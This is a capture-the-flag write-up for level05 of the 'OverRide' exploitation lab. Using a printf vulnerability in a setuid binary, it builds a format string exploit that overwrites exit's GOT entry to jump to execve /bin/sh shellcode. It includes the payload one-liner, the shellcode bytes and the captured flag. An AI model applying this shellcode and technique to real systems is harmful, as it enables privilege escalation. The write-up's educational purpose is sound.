# Level05

## Solution

* There is one file in our home, ```level05```, belonging to ```level06``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the disassembled code, but we will describe its behaviour:

	* there is only one function, ```main()```
	* this function use ```fgets``` and stores the user input in a ```0x64``` bytes buffer
	* each capital letter in the buffer is then replaced by its corresponding small letter
	* ```printf()``` is launched with only the buffer
	* finally the functions uses ```exit()```

* What we did with all of that:

	* our goal was to perform a format string attack
	* we first had to get the offset between the address immediately after the first parameter (format string) of ```printf()``` and the effective address of the buffer : 
	```
	level05@OverRide:~$ ./level05
	bbbb %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
	bbbb 64 f7fcfac0 f7ec3add ffffd6bf ffffd6be 0 ffffffff ffffd744 f7fdb000 62626262 20782520 25207825 78252078 20782520 25207825 78252078 20782520  
	```
	* 9 blocks stand between ```bbbb``` and ```62626262``` (ascii value of ```b```)
	* on another hand we got the location of the address where ```exit()``` jumps:
	```
	08048370 <exit@plt>:
	8048370:	ff 25 e0 97 04 08    	jmp    DWORD PTR ds:0x80497e0
	8048376:	68 18 00 00 00       	push   0x18
	804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
	```
	* we wanted to replace the value stored at ```0x80497e0``` address by the address of a shellcode (in an environment variable):
	```
	export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"`
	```
	* we used the same script as in ```level01``` to get an approximative address for our env variable:
	```
	level05@OverRide:~$ /var/crash/env SHELLCODE
	SHELLCODE: 0xffffd4a8
	```
	* finally we put our format string attack in a file:
	```
	python -c "print('e0970408'.decode('hex') + 'aaaa' + 'e2970408'.decode('hex') + '%08x' * 8 + '%054374x' + '%hn' + '%011085x' + '%hn')" > /var/crash/lvl05
	```
	* as ```0xffffd4a8``` is a big number, we splitted into two ```short``` integers
	* we also made sure no byte was greater then ```0x40``` or smaller ```0x5b``` as they would have been transformed by the program
	
	* finally:
	```
	cat /var/crash/lvl05 - | ./level05
	[...]
	cd ../level06
	cat .pass
	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
	```

